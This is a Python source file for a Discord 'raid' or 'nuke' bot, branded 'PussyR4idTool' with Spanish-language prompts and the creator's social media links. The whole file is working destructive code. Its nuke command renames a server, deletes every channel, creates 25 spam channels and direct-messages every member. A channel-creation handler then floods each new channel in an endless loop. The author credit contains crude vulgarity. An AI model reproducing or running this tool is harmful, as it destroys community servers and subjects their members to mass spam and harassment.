#Hecho Por YungJabi PussyFxker 2023
#Copyright 2023

import datetime
import discord 
import time
import os
from discord.ext import commands 
from discord.ext.commands import bot
from colorama import Fore

Rojo = Fore.RED
R = Fore.RESET

print(f"""{Rojo}
 888888ba                                       888888ba  dP   dP oo       dP 
 88    `8b                                      88    `8b 88   88          88 
a88aaaa8P' dP    dP .d8888b. .d8888b. dP    dP a88aaaa8P' 88aaa88 dP .d888b88 
 88        88    88 Y8ooooo. Y8ooooo. 88    88  88   `8b.      88 88 88'  `88 
 88        88.  .88       88       88 88.  .88  88     88      88 88 88.  .88 
 dP        `88888P' `88888P' `88888P' `8888P88  dP     dP      dP dP `88888P8 
                                           .88                                
                                       d8888P                                 
                         888888ba             dP                              
                         88    `8b            88                              
                        a88aaaa8P' .d8888b. d8888P                            
                         88   `8b. 88'  `88   88                              
                         88    .88 88.  .88   88                              
                         88888888P `88888P'   dP                              
"""+R)

token = input("Token: ")
time.sleep(1)
Prefix = input("Prefix: ")
time.sleep(1)
Svname =  input("ServerName: ")
time.sleep(1)
CanalName = input("NombreCanal: ")
time.sleep(1)
spamcanal = input("SpamMensaje: ")
time.sleep(1)
spamprivado = input("MensajePrivado: ")
time.sleep(1)

os.system('cls' if os.name == 'nt' else 'clear')

yj = commands.Bot(command_prefix=Prefix, intents=discord.Intents.all())

@yj.event
async def on_ready():
    print(f"""{Rojo}
 888888ba                                       888888ba  dP                  dP   
 88    `8b                                      88    `8b 88                  88   
a88aaaa8P' dP    dP .d8888b. .d8888b. dP    dP a88aaaa8P' 88d888b. .d8888b. d8888P 
 88        88    88 Y8ooooo. Y8ooooo. 88    88  88   `8b. 88'  `88 88'  `88   88   
 88        88.  .88       88       88 88.  .88  88     88 88.  .88 88.  .88   88   
 dP        `88888P' `88888P' `88888P' `8888P88  dP     dP 88Y8888' `88888P'   dP   
                                           .88                                     
                                       d8888P 
"""+R)
    print(f"==========================")   
    print(f"{Prefix}nuke | Nukea ServerCompleto")
    print(f"{Prefix}admin | Command Help")
    print(f"{Prefix}test | Test Command")
    print(f"==========================")
    
    
@yj.command()
async def test(ctx):    
    await ctx.send("prueba completada")

@yj.event
async def on_guild_channel_create(channel): 
    while True: 
        await channel.send(spamcanal) 
        print(f"[{Fore.RED}>{Fore.RESET}] MENSAJE ENVIADO : {spamcanal}")

@yj.command()   
async def nuke(ctx):
    await ctx.guild.edit(name=Svname)    
    for channel in list(ctx.guild.channels):    
        await channel.delete()
        print(f"[>] Canal Eliminado:{Rojo} {channel} {R} [<]")
    for i in range(25): 
        await ctx.guild.create_text_channel(CanalName)
        print(f"[>] Canal Creado:{Rojo} {CanalName} {R} [<]")  
        try:    
            for member in list(ctx.guild.members):
                await member.send(spamprivado)
                print(f"[>] Mensaje Enviado A:{Rojo} {member} {R} [<]")
        except: 
            print("Mensaje No Enviado")

@yj.command()   
async def admin(ctx):   
    embed=discord.Embed(title="```PussyR4idTool 2023 YJ```")
    embed.set_author(name="Admin Command")
    embed.add_field(name=f"{Prefix}nuke", value="Nuke Server Completo", inline=False)
    embed.add_field(name=f"{Prefix}test", value="Testea Bot En Server", inline=False)
    embed.add_field(name=f"**CreadorInfo**", 
value=f"""```[>] YOUTUBELINK: https://www.youtube.com/channel/UC-la9lkIJVjpVjww5BQjfVQ
[>] IG: https://www.instagram.com/g0dj4bi/```""", inline=True)
    embed.set_image(url="https://cdn.discordapp.com/attachments/1135065404373479434/1135278222469238784/photo_2023-07-26_22-38-31_5.jpg")
    embed.timestamp=datetime.datetime.today()
    await ctx.send(embed=embed)

yj.run(token=token)

